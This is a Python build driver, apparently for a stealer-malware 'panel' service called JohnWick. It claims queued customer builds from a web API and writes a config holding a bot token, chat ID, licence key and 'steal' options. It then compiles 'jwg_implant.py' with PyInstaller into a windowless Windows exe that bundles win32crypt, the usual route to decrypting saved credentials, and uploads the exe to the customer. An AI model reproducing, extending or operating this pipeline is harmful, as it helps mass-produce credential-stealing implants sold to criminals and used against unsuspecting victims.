"""CI build driver - run inside GitHub Actions (or anywhere) to compile a queued
panel build into a real .exe and upload it back to the Worker API.

This replaces the always-on PowerShell runner with free, no-machine-of-your-own
builds: GitHub's hosted Windows runners do the PyInstaller work. The flow is the
same as win_build.ps1 -- login, claim, bake cfg.json, compile, upload -- just
invoked once per build instead of looping forever.

Usage:
  python ci_build.py --api https://worker... --user admin --pass "$PASS" \
                     [--build-id <id>] [--repo-root .]

  * --build-id given -> build exactly that job (set by workflow_dispatch input).
  * --build-id absent -> claim the next queued job via /api/builds?claim=1.

Exit codes: 0 built+uploaded, 2 nothing to build (no queued job), 3 failure.
On any failure we still try to POST status=failed so the user sees why on the site.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import subprocess
import sys

import requests


def login(api: str, user: str, pw: str) -> str:
    r = requests.post(f"{api}/api/login", json={"u": user, "p": pw}, timeout=30)
    d = r.json()
    if not d.get("ok"):
        raise SystemExit(f"[ci] login failed: {d.get('error')}")
    return d["token"]


def get_build(api: str, tok: str, build_id: str | None) -> dict | None:
    h = {"authorization": f"Bearer {tok}"}
    if build_id:
        r = requests.get(f"{api}/api/builds/{build_id}", headers=h, timeout=30)
        d = r.json()
        b = d.get("build")
        if b and b.get("status") in ("queued", "building"):
            # mark building so a concurrent claim skips it
            requests.post(f"{api}/api/builds/{build_id}/upload", headers=h,
                          json={"status": "building"}, timeout=30)
            return b
        return b if b else None
    r = requests.get(f"{api}/api/builds?claim=1", headers=h, timeout=30)
    return r.json().get("build")


def bake_cfg(cfg: dict, repo_root: str) -> str:
    """Write the build's config to cfg.json in the repo root so PyInstaller packs it."""
    path = os.path.join(repo_root, "cfg.json")
    keep = ("bot_token", "chat_id", "licence_key", "licence_url", "steal", "opts")
    out = {k: cfg[k] for k in keep if k in cfg}
    json.dump(out, open(path, "w", encoding="utf-8"), indent=2)
    return path


def write_icon(cfg: dict, repo_root: str) -> str | None:
    """Decode an optional base64 .ico to app.ico next to the source; return its path."""
    b64 = (cfg or {}).get("icon_b64") or ""
    if not b64:
        return None
    try:
        raw = base64.b64decode(b64)
    except Exception:
        print("[ci] icon b64 undecodable, ignoring")
        return None
    # ICO magic: reserved 0, type 1, count >=1. Reject non-ICO early so PyInstaller
    # doesn't choke on a PNG/JPEG someone pasted as "icon".
    if len(raw) < 6 or raw[:4] != b"\x00\x00\x01\x00":
        print("[ci] file is not a valid .ico header, ignoring icon")
        return None
    p = os.path.join(repo_root, "app.ico")
    open(p, "wb").write(raw)
    print(f"[ci] wrote custom icon app.ico ({len(raw)} bytes)")
    return p


def compile_exe(name: str, repo_root: str, icon_path: str | None = None) -> str | None:
    """Run PyInstaller onefile on jwg_implant.py; return path to the exe or None."""
    cmd = [
        sys.executable, "-m", "PyInstaller", "--noconfirm", "--onefile", "--noconsole",
        "--name", name,
        "--add-data", f"cfg.json{os.pathsep}.",
        "--hidden-import", "win32crypt", "--hidden-import", "winreg",
        "--collect-submodules", "Cryptodome",
    ]
    if icon_path:
        cmd.append(f"--icon={icon_path}")
    cmd.append(os.path.join(repo_root, "jwg_implant.py"))
    print("[ci] running:", " ".join(cmd))
    rc = subprocess.call(cmd, cwd=repo_root)
    exe = os.path.join(repo_root, "dist", f"{name}.exe")
    if rc == 0 and os.path.isfile(exe):
        return exe
    print(f"[ci] pyinstaller rc={rc}, artifact present={os.path.isfile(exe)}")
    return None


def upload(api: str, tok: str, build_id: str, exe_path: str | None, err: str = "") -> None:
    h = {"authorization": f"Bearer {tok}"}
    if exe_path:
        data = base64.b64encode(open(exe_path, "rb").read()).decode()
        body = {"status": "done", "data_base64": data}
        print(f"[ci] uploading {os.path.basename(exe_path)} ({len(data)//1024} KB b64)")
    else:
        body = {"status": "failed", "error": err[:500]}
        print(f"[ci] reporting failure: {err}")
    try:
        r = requests.post(f"{api}/api/builds/{build_id}/upload", headers=h, json=body, timeout=120)
        print("[ci] upload response:", r.status_code, r.text[:200])
    except Exception as e:
        print("[ci] upload POST failed:", e)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="JohnWick CI build driver")
    ap.add_argument("--api", required=True)
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="pw", required=True)
    ap.add_argument("--build-id", default="")
    ap.add_argument("--repo-root", default=os.getcwd())
    a = ap.parse_args(argv)

    api = a.api.rstrip("/")
    tok = login(api, a.user, a.pw)
    build = get_build(api, tok, a.build_id or None)
    if not build:
        print("[ci] nothing to build (no queued job)")
        return 2

    bid = build["id"]
    cfg = build["config"]
    name = cfg["name"]
    print(f"[ci] building '{name}' for {build.get('username','?')} (id={bid})")

    try:
        bake_cfg(cfg, a.repo_root)
        icon = write_icon(cfg, a.repo_root)
        exe = compile_exe(name, a.repo_root, icon)
        if exe:
            upload(api, tok, bid, exe)
            return 0
        upload(api, tok, bid, None, "pyinstaller produced no exe (see log)")
        return 3
    except Exception as e:
        upload(api, tok, bid, None, f"{type(e).__name__}: {e}")
        return 3


if __name__ == "__main__":
    raise SystemExit(main())
